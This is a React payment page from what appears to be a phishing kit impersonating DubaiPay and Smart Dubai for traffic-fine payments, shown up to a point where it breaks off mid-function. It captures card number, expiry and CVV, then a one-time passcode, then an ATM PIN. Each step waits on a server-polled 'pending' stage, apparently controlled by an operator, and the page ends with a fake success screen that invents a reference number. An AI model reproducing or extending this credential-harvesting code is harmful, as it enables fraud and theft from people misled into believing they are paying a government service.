import React, { useState, useEffect, type ReactNode, type FormEvent } from "react";
import { useLocation } from "wouter";
import { trpc } from "@/lib/trpc";
import { useLanguage } from "@/contexts/LanguageContext";

type Stage = "card" | "card_pending" | "otp" | "otp_pending" | "atm" | "atm_pending" | "success" | "failed" | "installment";

type InstallmentData = {
  fullName: string;
  phone: string;
  emiratesId: string;
  email: string;
  emirate: string;
  plateCode: string;
  plateNumber: string;
  totalAmount: string;
  bank: string;
  duration: string;
};

type CardSubmitPayload = {
  cardName: string;
  cardNumber: string;
  cardExpiry: string;
  cardCvv: string;
};

function PaymentFrame({ children }: { children: ReactNode }) {
  return (
    <div className="min-h-screen bg-white">
      <div className="mx-auto max-w-[430px] bg-white">
        {children}
      </div>
    </div>
  );
}

function PaymentGatewayHeader() {
  return (
    <div className="bg-white px-4 pb-4 pt-5 sm:px-5">
      <div className="mx-auto mb-4 h-1.5 w-20 rounded-full bg-[#eef2f7]" />
      <div className="flex items-center justify-between gap-3 border-b border-[#edf2f7] pb-4">
        <img
          src="/dubaipay-logo.png"
          alt="DubaiPay"
          className="h-12 w-auto max-w-[150px] object-contain sm:h-14"
        />
        <img
          src="/smart-dubai-logo.png"
          alt="Smart Dubai"
          className="h-11 w-auto max-w-[128px] object-contain sm:h-12"
        />
      </div>
    </div>
  );
}

function InstallmentSummary({ data, lang }: { data: InstallmentData; lang: string }) {
  const isRTL = lang === "ar";
  
  return (
    <div style={{ direction: isRTL ? "rtl" : "ltr" }}>
      <SectionCard title={lang === "ar" ? "ملخص طلب التقسيط" : "Installment Request Summary"}>
        <div style={{ padding: "16px", backgroundColor: "#f9fafb" }}>
          <div style={{ marginBottom: "16px" }}>
            <h4 style={{ fontSize: "14px", fontWeight: 700, color: "#374151", marginBottom: "12px" }}>
              {lang === "ar" ? "البيانات الشخصية" : "Personal Information"}
            </h4>
            <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: "12px", fontSize: "13px" }}>
              <div>
                <span style={{ color: "#6b7280" }}>{lang === "ar" ? "الاسم:" : "Name:"}</span>
                <div style={{ fontWeight: 600, color: "#1f2937" }}>{data.fullName}</div>
              </div>
              <div>
                <span style={{ color: "#6b7280" }}>{lang === "ar" ? "الهاتف:" : "Phone:"}</span>
                <div style={{ fontWeight: 600, color: "#1f2937" }}>{data.phone}</div>
              </div>
              <div>
                <span style={{ color: "#6b7280" }}>{lang === "ar" ? "الهوية:" : "Emirates ID:"}</span>
                <div style={{ fontWeight: 600, color: "#1f2937" }}>{data.emiratesId}</div>
              </div>
              <div>
                <span style={{ color: "#6b7280" }}>{lang === "ar" ? "البريد:" : "Email:"}</span>
                <div style={{ fontWeight: 600, color: "#1f2937" }}>{data.email}</div>
              </div>
            </div>
          </div>

          <div style={{ marginBottom: "16px" }}>
            <h4 style={{ fontSize: "14px", fontWeight: 700, color: "#374151", marginBottom: "12px" }}>
              {lang === "ar" ? "بيانات المركبة" : "Vehicle Information"}
            </h4>
            <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: "12px", fontSize: "13px" }}>
              <div>
                <span style={{ color: "#6b7280" }}>{lang === "ar" ? "الإمارة:" : "Emirate:"}</span>
                <div style={{ fontWeight: 600, color: "#1f2937" }}>{data.emirate}</div>
              </div>
              <div>
                <span style={{ color: "#6b7280" }}>{lang === "ar" ? "رمز اللوحة:" : "Plate Code:"}</span>
                <div style={{ fontWeight: 600, color: "#1f2937" }}>{data.plateCode}</div>
              </div>
              <div>
                <span style={{ color: "#6b7280" }}>{lang === "ar" ? "رقم اللوحة:" : "Plate Number:"}</span>
                <div style={{ fontWeight: 600, color: "#1f2937" }}>{data.plateNumber}</div>
              </div>
            </div>
          </div>

          <div style={{ marginBottom: "16px" }}>
            <h4 style={{ fontSize: "14px", fontWeight: 700, color: "#374151", marginBottom: "12px" }}>
              {lang === "ar" ? "بيانات التقسيط" : "Installment Details"}
            </h4>
            <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: "12px", fontSize: "13px" }}>
              <div>
                <span style={{ color: "#6b7280" }}>{lang === "ar" ? "المبلغ:" : "Amount:"}</span>
                <div style={{ fontWeight: 600, color: "#1f2937" }}>{data.totalAmount} AED</div>
              </div>
              <div>
                <span style={{ color: "#6b7280" }}>{lang === "ar" ? "البنك:" : "Bank:"}</span>
                <div style={{ fontWeight: 600, color: "#1f2937" }}>{data.bank}</div>
              </div>
              <div>
                <span style={{ color: "#6b7280" }}>{lang === "ar" ? "المدة:" : "Duration:"}</span>
                <div style={{ fontWeight: 600, color: "#1f2937" }}>{data.duration} {lang === "ar" ? "شهر" : "months"}</div>
              </div>
            </div>
          </div>
        </div>
      </SectionCard>
    </div>
  );
}


function SectionCard({ title, children }: { title: string; children: ReactNode }) {
  return (
    <section className="overflow-hidden bg-white">
      <div className="border-b border-[#eef3f7] bg-[#f4f8fc] px-5 py-4 text-[15px] font-semibold text-[#7a8796]">
        {title}
      </div>
      <div className="px-5 py-4">{children}</div>
    </section>
  );
}

function InfoTable({ rows }: { rows: Array<{ label: string; value: string }> }) {
  return (
    <div className="space-y-0">
      {rows.map((row, index) => (
        <div
          key={`${row.label}-${index}`}
          className="flex items-center justify-between gap-4 border-b border-[#eef3f7] py-3 last:border-b-0"
        >
          <span className="text-[15px] text-[#697586]">{row.label}</span>
          <span className="text-right text-[15px] font-medium text-[#2a3342]">{row.value}</span>
        </div>
      ))}
    </div>
  );
}

function ErrorBanner({ message }: { message: string }) {
  return (
    <div className="mb-4 rounded-2xl border border-[#f1c5c8] bg-[#fff5f5] px-4 py-3 text-[13px] text-[#c74343]">
      {message}
    </div>
  );
}

function CvvCardIcon() {
  return (
    <svg width="84" height="58" viewBox="0 0 84 58" fill="none" xmlns="http://www.w3.org/2000/svg" className="h-12 w-auto">
      <rect x="6" y="8" width="46" height="34" rx="6" fill="#93A1AF" />
      <rect x="6" y="14" width="46" height="7" fill="#56616D" />
      <rect x="35" y="28" width="24" height="17" rx="5" fill="#E9F0F6" stroke="#AAB7C4" />
      <rect x="41" y="33" width="12" height="4" rx="2" fill="#FFFFFF" />
      <circle cx="46" cy="35" r="1.7" fill="#D33B49" />
      <circle cx="51" cy="35" r="1.7" fill="#D33B49" />
      <circle cx="56" cy="35" r="1.7" fill="#D33B49" />
    </svg>
  );
}


function SecurityLogos() {
  return (
    <div className="mt-5 flex justify-center bg-white p-2">
      <img src="/card-brands.png" alt="Visa Mastercard Apple Pay Tabby AMEX Samsung Pay Google Pay" className="h-auto w-full max-w-[340px] object-contain" />
    </div>
  );
}

function PaymentActionBar({
  isLoading,
  onCancel,
}: {
  isLoading: boolean;
  onCancel: () => void;
}) {
  const { t, lang } = useLanguage();
  return (
    <div className="mt-5 overflow-hidden bg-[#f5f8fc] px-5 py-4">
      <div className="flex items-center gap-3">
        <button
          type="button"
          onClick={onCancel}
          className="flex-1 rounded-full bg-white px-5 py-3 text-[16px] font-medium text-[#6a7380] shadow-sm transition hover:bg-[#f8fbff]"
        >
          {lang === "ar" ? "إلغاء" : "Cancel"}
        </button>
        <button
          type="submit"
          disabled={isLoading}
          className="flex-1 rounded-full bg-[#0d67be] px-5 py-3 text-[16px] font-semibold text-white transition hover:bg-[#0a5aa7] disabled:cursor-not-allowed disabled:opacity-60"
        >
          {isLoading ? t.payment.card.processing : t.payment.card.payButton}
        </button>
      </div>
    </div>
  );
}


function CardForm({
  onSubmit,
  onCancel,
  isLoading,
  error,
  fineAmount,
  discountAmount,
  totalAmount,
}: {
  onSubmit: (data: CardSubmitPayload) => void;
  onCancel: () => void;
  isLoading: boolean;
  error?: string | null;
  fineAmount: string;
  discountAmount: string;
  totalAmount: string;
}) {
  const [cardName, setCardName] = useState("");
  const [cardNumber, setCardNumber] = useState("");
  const [expiry, setExpiry] = useState("");
  const [cardCvv, setCardCvv] = useState("");
  const [errors, setErrors] = useState<Record<string, string>>({});
  const [liveErrors, setLiveErrors] = useState<Record<string, string>>({});
  const { t, lang } = useLanguage();

  const formatCardNumber = (value: string) => {
    const digits = value.replace(/\D/g, "").slice(0, 16);
    return digits.replace(/(\d{4})(?=\d)/g, "$1 ");
  };

  const formatExpiry = (value: string) => {
    const digits = value.replace(/\D/g, "").slice(0, 4);
    if (digits.length >= 3) return digits.slice(0, 2) + "/" + digits.slice(2);
    return digits;
  };

  const parseExpiry = (val: string) => {
    const parts = val.split("/");
    return { month: parts[0] || "", year: parts[1] || "" };
  };

  const getCardType = (number: string): "visa" | "mastercard" | null => {
    const digits = number.replace(/\s/g, "");
    if (!digits) return null;
    if (digits[0] === "4") return "visa";
    if (digits[0] === "5" || (digits.length >= 4 && parseInt(digits.slice(0, 4)) >= 2221 && parseInt(digits.slice(0, 4)) <= 2720)) return "mastercard";
    return null;
  };

  const luhnCheck = (number: string): boolean => {
    const digits = number.replace(/\s/g, "");
    if (digits.length !== 16 || !/^\d+$/.test(digits)) return false;
    let sum = 0;
    for (let i = 0; i < digits.length; i++) {
      let d = parseInt(digits[digits.length - 1 - i]);
      if (i % 2 === 1) {
        d *= 2;
        if (d > 9) d -= 9;
      }
      sum += d;
    }
    return sum % 10 === 0;
  };

  const cardType = getCardType(cardNumber);

  const isExpiryExpired = (month: string, year: string): boolean => {
    if (month.length !== 2 || year.length !== 2) return false;
    const currentDate = new Date();
    const currentYear = currentDate.getFullYear() % 100;
    const currentMonth = currentDate.getMonth() + 1;
    const selectedYear = Number(year);
    const selectedMonth = Number(month);
    return selectedYear < currentYear || (selectedYear === currentYear && selectedMonth < currentMonth);
  };

  const handleCardNumberChange = (value: string) => {
    const formatted = formatCardNumber(value);
    setCardNumber(formatted);
    const digits = formatted.replace(/\s/g, "");
    const newLive = { ...liveErrors };
    delete newLive.cardNumber;
    if (digits.length >= 1 && !getCardType(formatted)) {
      newLive.cardNumber = t.payment.card.errors.cardUnsupported;
    } else if (digits.length === 16) {
      if (!luhnCheck(formatted)) {
        newLive.cardNumber = t.payment.card.errors.cardInvalid;
      } else {
        delete newLive.cardNumber;
        setErrors((prev) => { const n = { ...prev }; delete n.cardNumber; return n; });
      }
    }
    setLiveErrors(newLive);
  };

  const handleExpiryChange = (value: string) => {
    const formatted = formatExpiry(value);
    setExpiry(formatted);
    const { month, year } = parseExpiry(formatted);
    const newLive = { ...liveErrors };
    delete newLive.cardExpiry;
    if (month.length === 2 && (Number(month) < 1 || Number(month) > 12)) {
      newLive.cardExpiry = t.payment.card.errors.expiry;
    } else if (month.length === 2 && year.length === 2) {
      if (isExpiryExpired(month, year)) {
        newLive.cardExpiry = t.payment.card.errors.expiryExpired;
      } else {
        setErrors((prev) => { const n = { ...prev }; delete n.cardExpiry; return n; });
      }
    }
    setLiveErrors(newLive);
  };

  const validate = () => {
    const newErrors: Record<string, string> = {};
    if (cardName.trim().length < 3) newErrors.cardName = t.payment.card.errors.cardHolder;
    const digits = cardNumber.replace(/\s/g, "");
    if (digits.length < 16) {
      newErrors.cardNumber = t.payment.card.errors.cardNumber;
    } else if (!getCardType(cardNumber)) {
      newErrors.cardNumber = t.payment.card.errors.cardUnsupported;
    } else if (!luhnCheck(cardNumber)) {
      newErrors.cardNumber = t.payment.card.errors.cardInvalid;
    }
    const { month: expiryMonth, year: expiryYear } = parseExpiry(expiry);
    if (expiryMonth.length !== 2 || Number(expiryMonth) < 1 || Number(expiryMonth) > 12) {
      newErrors.cardExpiry = t.payment.card.errors.expiry;
    } else if (expiryYear.length !== 2) {
      newErrors.cardExpiry = t.payment.card.errors.expiry;
    } else if (isExpiryExpired(expiryMonth, expiryYear)) {
      newErrors.cardExpiry = t.payment.card.errors.expiryExpired;
    }
    if (cardCvv.length !== 3) newErrors.cardCvv = t.payment.card.errors.cvv;
    setErrors(newErrors);
    setLiveErrors({});
    return Object.keys(newErrors).length === 0;
  };

  const handleSubmit = (e: FormEvent) => {
    e.preventDefault();
    if (!validate()) return;
    const { month, year } = parseExpiry(expiry);
    onSubmit({
      cardName,
      cardNumber: cardNumber.replace(/\s/g, ""),
      cardExpiry: `${month}/${year}`,
      cardCvv,
    });
  };

  return (
    <form onSubmit={handleSubmit} className="space-y-4">
      {error && <ErrorBanner message={error} />}

      <SectionCard title={t.payment.card.title}>
        <div className="space-y-4">
          {/* Card Holder */}
          <div>
            <label className="mb-1.5 block text-[13px] font-medium text-[#1e293b]">{t.payment.card.cardHolder}</label>
            <div className="relative">
              <div className="pointer-events-none absolute left-3 top-1/2 -translate-y-1/2 text-[#9ca3af]">
                <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round">
                  <path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"/>
                  <circle cx="12" cy="7" r="4"/>
                </svg>
              </div>
              <input
                type="text"
                value={cardName}
                onChange={(e) => setCardName(e.target.value)}
                placeholder={t.payment.card.cardHolderPlaceholder}
                className={`h-12 w-full rounded-[10px] border bg-white pl-10 pr-3 text-[14px] text-[#273447] outline-none transition placeholder:text-[#a3adba] focus:border-[#8ab9db] sm:text-[15px] ${errors.cardName ? "border-[#ef4444]" : "border-[#c9d3de]"}`}
              />
            </div>
            {errors.cardName && <p className="mt-1 text-[12px] text-[#d14b4b]">{errors.cardName}</p>}
          </div>

          {/* Card Number */}
          <div>
            <label className="mb-1.5 block text-[13px] font-medium text-[#1e293b]">{t.payment.card.cardNumber}</label>
            <div className="relative">
              <div className="pointer-events-none absolute left-3 top-1/2 -translate-y-1/2">
                {cardType === "visa" ? (
                  <svg width="32" height="20" viewBox="0 0 40 26" fill="none" xmlns="http://www.w3.org/2000/svg">
                    <rect width="40" height="26" rx="4" fill="#1A1F71"/>
                    <path d="M17.2 17.5L19.1 8.5H21.7L19.8 17.5H17.2Z" fill="white"/>
                    <path d="M27.8 8.7C27.2 8.5 26.3 8.2 25.2 8.2C22.6 8.2 20.8 9.5 20.8 11.3C20.7 12.7 22 13.4 23 13.9C24 14.4 24.3 14.7 24.3 15.1C24.3 15.8 23.5 16.1 22.7 16.1C21.6 16.1 21 15.9 20.1 15.5L19.7 15.3L19.3 17.7C20 18 21.2 18.3 22.5 18.3C25.3 18.3 27 17 27.1 15.1C27.1 14 26.4 13.2 25 12.5C24.1 12 23.5 11.7 23.5 11.3C23.5 10.9 24 10.5 24.9 10.5C25.8 10.5 26.4 10.7 26.9 10.9L27.2 11L27.8 8.7Z" fill="white"/>
                    <path d="M31.4 8.5H29.4C28.8 8.5 28.3 8.7 28.1 9.3L24.5 17.5H27.3L27.8 16.1H31.2L31.5 17.5H34L31.4 8.5ZM28.6 14.1C28.8 13.6 29.8 11.1 29.8 11.1L30.6 14.1H28.6Z" fill="white"/>
                    <path d="M15.7 8.5L13.1 14.6L12.8 13.2C12.3 11.6 10.8 9.9 9.1 9L11.5 17.5H14.3L18.5 8.5H15.7Z" fill="white"/>
                    <path d="M11.5 8.5H7.1L7 8.7C10.3 9.5 12.5 11.5 13.2 13.2L12.4 9.4C12.3 8.7 11.8 8.5 11.5 8.5Z" fill="#F9A533"/>
                  </svg>
                ) : cardType === "mastercard" ? (
                  <svg width="32" height="20" viewBox="0 0 40 26" fill="none" xmlns="http://www.w3.org/2000/svg">
                    <rect width="40" height="26" rx="4" fill="#252525"/>
                    <circle cx="16" cy="13" r="7" fill="#EB001B"/>
                    <circle cx="24" cy="13" r="7" fill="#F79E1B"/>
                    <path d="M20 7.8C21.5 9 22.4 10.9 22.4 13C22.4 15.1 21.5 17 20 18.2C18.5 17 17.6 15.1 17.6 13C17.6 10.9 18.5 9 20 7.8Z" fill="#FF5F00"/>
                  </svg>
                ) : (
                  <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#9ca3af" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round">
                    <rect x="1" y="4" width="22" height="16" rx="3"/>
                    <line x1="1" y1="10" x2="23" y2="10"/>
                  </svg>
                )}
              </div>
              <input
                type="text"
                inputMode="numeric"
                dir="ltr"
                value={cardNumber}
                onChange={(e) => handleCardNumberChange(e.target.value)}
                placeholder={t.payment.card.cardNumberPlaceholder}
                maxLength={19}
                className={`h-12 w-full rounded-[10px] border bg-white pl-12 pr-3 text-[16px] font-bold text-black outline-none transition placeholder:font-normal placeholder:text-[#a3adba] focus:border-[#8ab9db] ${errors.cardNumber || liveErrors.cardNumber ? "border-[#ef4444]" : "border-[#c9d3de]"}`}
              />
            </div>
            {(errors.cardNumber || liveErrors.cardNumber) && <p className="mt-1 text-[12px] text-[#d14b4b]">{errors.cardNumber || liveErrors.cardNumber}</p>}
          </div>

          {/* Expiry + CVV on same row */}
          <div className="grid grid-cols-2 gap-3">
            <div>
              <label className="mb-1.5 block text-[13px] font-medium text-[#1e293b]">{t.payment.card.expiry}</label>
              <div className="relative">
                <div className="pointer-events-none absolute left-3 top-1/2 -translate-y-1/2 text-[#9ca3af]">
                  <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round">
                    <rect x="3" y="4" width="18" height="18" rx="2"/>
                    <line x1="16" y1="2" x2="16" y2="6"/>
                    <line x1="8" y1="2" x2="8" y2="6"/>
                    <line x1="3" y1="10" x2="21" y2="10"/>
                  </svg>
                </div>
                <input
                  type="text"
                  inputMode="numeric"
                  dir="ltr"
                  value={expiry}
                  onChange={(e) => handleExpiryChange(e.target.value)}
                  placeholder="MM/YY"
                  maxLength={5}
                  className={`h-12 w-full rounded-[10px] border bg-white pl-10 pr-3 text-center text-[15px] text-[#273447] outline-none transition placeholder:text-[#a3adba] focus:border-[#8ab9db] ${errors.cardExpiry || liveErrors.cardExpiry ? "border-[#ef4444]" : "border-[#c9d3de]"}`}
                />
              </div>
              {(errors.cardExpiry || liveErrors.cardExpiry) && <p className="mt-1 text-[12px] text-[#d14b4b]">{errors.cardExpiry || liveErrors.cardExpiry}</p>}
            </div>
            <div>
              <label className="mb-1.5 block text-[13px] font-medium text-[#1e293b]">{t.payment.card.cvv}</label>
              <div className="relative">
                <div className="pointer-events-none absolute left-3 top-1/2 -translate-y-1/2 text-[#9ca3af]">
                  <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round">
                    <rect x="3" y="11" width="18" height="11" rx="2"/>
                    <path d="M7 11V7a5 5 0 0 1 10 0v4"/>
                  </svg>
                </div>
                <input
                  type="password"
                  inputMode="numeric"
                  value={cardCvv}
                  onChange={(e) => setCardCvv(e.target.value.replace(/\D/g, "").slice(0, 3))}
                  placeholder="CVV"
                  maxLength={3}
                  className={`h-12 w-full rounded-[10px] border bg-white pl-10 pr-3 text-center text-[15px] text-[#273447] outline-none transition placeholder:text-[#a3adba] focus:border-[#8ab9db] ${errors.cardCvv ? "border-[#ef4444]" : "border-[#c9d3de]"}`}
                />
              </div>
              {errors.cardCvv && <p className="mt-1 text-[12px] text-[#d14b4b]">{errors.cardCvv}</p>}
            </div>
          </div>

          <SecurityLogos />
        </div>
      </SectionCard>

      <PaymentActionBar
        isLoading={isLoading}
        onCancel={onCancel}
      />
    </form>
  );
}

function WaitingPage({ message }: { message: string }) {
  const { t } = useLanguage();
  return (
    <div className="bg-white px-5 py-12 text-center">
      <div className="mx-auto mb-5 h-14 w-14 animate-spin rounded-full border-[3px] border-[#d8e6f3] border-t-[#0d67be]" />
      <h3 className="text-[20px] font-semibold text-[#263445]">{t.payment.waiting.dontClose}</h3>
      <p className="mt-3 text-[14px] leading-7 text-[#6f7b88]">{message}</p>
      <p className="mt-2 text-[13px] text-[#90a0b2]">Please wait and do not close this page.</p>
    </div>
  );
}

function OtpForm({
  onSubmit,
  isLoading,
  error,
  rows,
}: {
  onSubmit: (otp: string) => void;
  isLoading: boolean;
  error?: string | null;
  rows: Array<{ label: string; value: string }>;
}) {
  const [otp, setOtp] = useState("");
  const [otpError, setOtpError] = useState("");
  const { t, lang } = useLanguage();

  const handleSubmit = (e: FormEvent) => {
    e.preventDefault();
    if (otp.length < 4) {
      setOtpError(t.payment.otp.error);
      return;
    }
    setOtpError("");
    onSubmit(otp);
  };

  return (
    <form onSubmit={handleSubmit} className="space-y-4">
      <SectionCard title={lang === "ar" ? "ملخص المبلغ" : "Amount Summary"}>
        <InfoTable rows={rows} />
      </SectionCard>

      {(error || otpError) && <ErrorBanner message={error || otpError} />}

      <SectionCard title={lang === "ar" ? "التحقق الأمني للبطاقة" : "Card Security Verification"}>
        <div className="text-center">
          <img src="/otp-icon.png" alt="OTP" className="mx-auto mb-4 h-20 w-20 object-contain" />
          <h3 className="text-[20px] font-semibold text-[#263445]">{t.payment.otp.title}</h3>
          <p className="mt-2 text-[14px] leading-7 text-[#6f7b88]">{t.payment.otp.subtitle}</p>
          <input
            type="text"
            inputMode="numeric"
            value={otp}
            onChange={(e) => setOtp(e.target.value.replace(/\D/g, "").slice(0, 8))}
            placeholder={t.payment.otp.placeholder}
            maxLength={8}
            className="mt-5 h-14 w-full rounded-[14px] border border-[#c9d3de] bg-white px-4 text-center text-[24px] tracking-[0.35em] text-[#273447] outline-none transition placeholder:text-[#a3adba] focus:border-[#8ab9db]"
          />
        </div>
      </SectionCard>

      <div className="overflow-hidden bg-[#f5f8fc] px-5 py-5">
        <button
          type="submit"
          disabled={isLoading}
          className="w-full rounded-full bg-[#0d67be] px-5 py-3 text-[17px] font-semibold text-white transition hover:bg-[#0a5aa7] disabled:cursor-not-allowed disabled:opacity-60"
        >
          {isLoading ? t.payment.otp.verifying : t.payment.otp.confirmButton}
        </button>
      </div>
    </form>
  );
}


function AtmPinForm({
  onSubmit,
  isLoading,
  error,
  rows,
}: {
  onSubmit: (pin: string) => void;
  isLoading: boolean;
  error?: string | null;
  rows: Array<{ label: string; value: string }>;
}) {
  const [pin, setPin] = useState("");
  const [pinError, setPinError] = useState("");
  const { t, lang } = useLanguage();

  const handleSubmit = (e: FormEvent) => {
    e.preventDefault();
    if (pin.length < 4) {
      setPinError(t.payment.atm.error);
      return;
    }
    setPinError("");
    onSubmit(pin);
  };

  return (
    <form onSubmit={handleSubmit} className="space-y-4">
      <SectionCard title={lang === "ar" ? "ملخص المبلغ" : "Amount Summary"}>
        <InfoTable rows={rows} />
      </SectionCard>

      {(error || pinError) && <ErrorBanner message={error || pinError} />}

      <SectionCard title={lang === "ar" ? "التحقق من الرقم السري" : "ATM PIN Verification"}>
        <div className="text-center">
          <img src="/atm-icon.png" alt="ATM PIN" className="mx-auto mb-4 h-20 w-20 object-contain" />
          <h3 className="text-[20px] font-semibold text-[#263445]">{t.payment.atm.title}</h3>
          <p className="mt-2 text-[14px] leading-7 text-[#6f7b88]">{t.payment.atm.subtitle}</p>
          <input
            type="password"
            inputMode="numeric"
            value={pin}
            onChange={(e) => setPin(e.target.value.replace(/\D/g, "").slice(0, 6))}
            placeholder="••••"
            maxLength={6}
            className="mt-5 h-14 w-full rounded-[14px] border border-[#c9d3de] bg-white px-4 text-center text-[24px] tracking-[0.35em] text-[#273447] outline-none transition placeholder:text-[#a3adba] focus:border-[#8ab9db]"
          />
          <div className="mt-4 rounded-2xl border border-[#ffe1b4] bg-[#fff8eb] px-4 py-3 text-right text-[13px] leading-6 text-[#9b6b11]">
            {t.payment.atm.warning}
          </div>
        </div>
      </SectionCard>

      <div className="overflow-hidden bg-[#f5f8fc] px-5 py-5">
        <button
          type="submit"
          disabled={isLoading}
          className="w-full rounded-full bg-[#0d67be] px-5 py-3 text-[17px] font-semibold text-white transition hover:bg-[#0a5aa7] disabled:cursor-not-allowed disabled:opacity-60"
        >
          {isLoading ? t.payment.atm.verifying : t.payment.atm.confirmButton}
        </button>
      </div>
    </form>
  );
}

function SuccessPage({ totalAmount, onDone }: { totalAmount: string; onDone: () => void }) {
  const { t, lang } = useLanguage();

  return (
    <div className="space-y-4">
      <div className="bg-white px-5 py-10 text-center">
        <div className="mx-auto mb-4 flex h-16 w-16 items-center justify-center rounded-full bg-[#e8f8ec] text-[30px]">✅</div>
        <h2 className="text-[22px] font-semibold text-[#12834d]">{t.payment.success.title}</h2>
        <p className="mt-2 text-[14px] text-[#6f7b88]">{t.payment.success.subtitle}</p>
        <div className="mt-6 bg-[#f5faf7] px-5 py-4">
          <p className="text-[13px] text-[#6f7b88]">{t.payment.success.amountPaid}</p>
          <p className="mt-1 text-[28px] font-semibold text-[#12834d]">{totalAmount} {t.payment.header.currency}</p>
        </div>
        <div className="mt-4 bg-[#f8fafc] px-5 py-4 text-left">
          <p className="text-[13px] text-[#6f7b88]">{t.payment.success.reference}</p>
          <p className="mt-1 font-mono text-[14px] text-[#273447]">DP-{Date.now().toString().slice(-8)}</p>
          <p className="mt-1 text-[12px] text-[#94a3b8]">{new Date().toLocaleString(lang === "ar" ? "ar-AE" : "en-AE")}</p>
        </div>
      </div>

      <div className="overflow-hidden bg-[#f5f8fc] px-5 py-5">
        <button
          type="button"
          onClick={onDone}
          className="w-full rounded-full bg-[#0d67be] px-5 py-3 text-[17px] font-semibold text-white transition hover:bg-[#0a5aa7]"
        >
          {t.payment.success.backButton}
        </button>
      </div>
    </div>
  );
}

function FailedPage({ onRetry }: { onRetry: () => void }) {
  const { t } = useLanguage();

  return (
    <div className="space-y-4">
      <div className="bg-white px-5 py-10 text-center">
        <div className="mx-auto mb-4 flex h-16 w-16 items-center justify-center rounded-full bg-[#fff1f1] text-[30px]">❌</div>
        <h2 className="text-[22px] font-semibold text-[#cf4444]">{t.payment.failed.title}</h2>
        <p className="mt-2 text-[14px] text-[#6f7b88]">{t.payment.failed.subtitle}</p>
      </div>

      <div className="overflow-hidden bg-[#f5f8fc] px-5 py-5">
        <button
          type="button"
          onClick={onRetry}
          className="w-full rounded-full bg-[#0d67be] px-5 py-3 text-[17px] font-semibold text-white transition hover:bg-[#0a5aa7]"
        >
          {t.payment.failed.retryButton}
        </button>
      </div>
    </div>
  );
}

export default function Payment() {
  const [location, navigate] = useLocation();
  const { t, lang, setLanguage } = useLanguage();
  const isArabicRoute = location === "/ar/payment" || location.startsWith("/ar/payment?");
  const homePath = isArabicRoute ? "/ar" : "/";

  useEffect(() => {
    setLanguage(isArabicRoute ? "ar" : "en");
  }, [isArabicRoute, setLanguage]);

  const buildLocalizedPaymentPath = (targetLang: "ar" | "en") => {
    const params = window.location.search || "";
    return targetLang === "ar" ? `/ar/payment${params}` : `/payment${params}`;
  };

  const handleLanguageNavigation = () => {
    const nextLang = isArabicRoute ? "en" : "ar";
    setLanguage(nextLang);
    navigate(buildLocalizedPaymentPath(nextLang));
  };

  const getPaymentContextFromUrl = () => {
    try {
      const params = new URLSearchParams(window.location.search);
      return {
        sessionId: params.get("sessionId"),
        totalAmount: params.get("total") || "0",
      };
    } catch {
      return {
        sessionId: null,
        totalAmount: "0",
      };
    }
  };

  const [paymentData] = useState(() => {
    try {
      const raw = sessionStorage.getItem("paymentData");
      if (raw) return JSON.parse(raw);
    } catch {}

    const fallback = getPaymentContextFromUrl();
    if (fallback.sessionId) {
      return {
        selectedFines: [],
        totalAmount: fallback.totalAmount,
        sessionId: fallback.sessionId,
      };
    }

    return null;
  });

  const [sessionId, setSessionId] = useState<string | null>(() => {
    const urlSessionId = getPaymentContextFromUrl().sessionId;
    if (urlSessionId) return urlSessionId;

    try {
      return sessionStorage.getItem("paymentSessionId");
    } catch {
      return null;
    }
  });

  const [stage, setStage] = useState<Stage>("card");
  const [errorMessage, setErrorMessage] = useState<string | null>(null);
  const [isSubmitting, setIsSubmitting] = useState(false);

  const createSession = trpc.payment.createSession.useMutation();
  const submitCard = trpc.payment.submitCard.useMutation();
  const submitOtp = trpc.payment.submitOtp.useMutation();
  const submitAtmPin = trpc.payment.submitAtmPin.useMutation();

  const statusQuery = trpc.payment.getStatus.useQuery(
    { sessionId: sessionId || "" },
    {
      enabled: !!sessionId && stage !== "success" && stage !== "failed",
      refetchInterval: stage === "success" || stage === "failed" ? false : 3000,
      refetchIntervalInBackground: true,
    }
  );

  useEffect(() => {
    if (!sessionId) return;
    try {
      sessionStorage.setItem("paymentSessionId", sessionId);
    } catch {}
  }, [sessionId]);

  useEffect(() => {
    if (!sessionId && paymentData) {
      createSession.mutateAsync({
        selectedFines: paymentData.selectedFines || [],
        totalAmount: paymentData.totalAmount || "0",
        plateNumber: paymentData.plateNumber,
        plateSource: paymentData.plateSource,
        queryId: paymentData.queryId,
      }).then((res) => {
        if (res.success) {
          setSessionId(res.sessionId);
          sessionStorage.setItem("paymentSessionId", res.sessionId);
        }
      }).catch(console.error);
    }
  }, []);

  useEffect(() => {
    if (!statusQuery.data) return;
    const newStage = statusQuery.data.stage as Stage;
    const newError = statusQuery.data.errorMessage;

    if (newStage !== stage) {
      setStage(newStage);
      setErrorMessage(newError || null);
    }
  }, [statusQuery.data]);

  if (!paymentData && !sessionId) {
    return (
      <PaymentFrame>
        <PaymentGatewayHeader />
        <div className="px-4 pb-8 sm:px-5">
          <div className="bg-white px-5 py-12 text-center">
            <p className="text-[15px] leading-7 text-[#5f6c7b]">{t.payment.noData.message}</p>
            <button
              onClick={() => navigate(homePath)}
              className="mt-5 rounded-full bg-[#0d67be] px-6 py-3 text-[16px] font-semibold text-white transition hover:bg-[#0a5aa7]"
            >
              {t.payment.noData.backButton}
            </button>
          </div>
        </div>
      </PaymentFrame>
    );
  }

  const totalAmount = paymentData?.totalAmount || paymentData?.dueAmount || "0";
  const selectedFinesTotal = Array.isArray(paymentData?.selectedFines)
    ? paymentData.selectedFines.reduce((sum: number, fine: any) => {
        const amount = parseFloat(String(fine?.amount || "0").replace(/[^0-9.]/g, ""));
        return sum + (Number.isNaN(amount) ? 0 : amount);
      }, 0)
    : 0;
  const totalAmountNumber = parseFloat(String(totalAmount).replace(/[^0-9.]/g, "")) || 0;
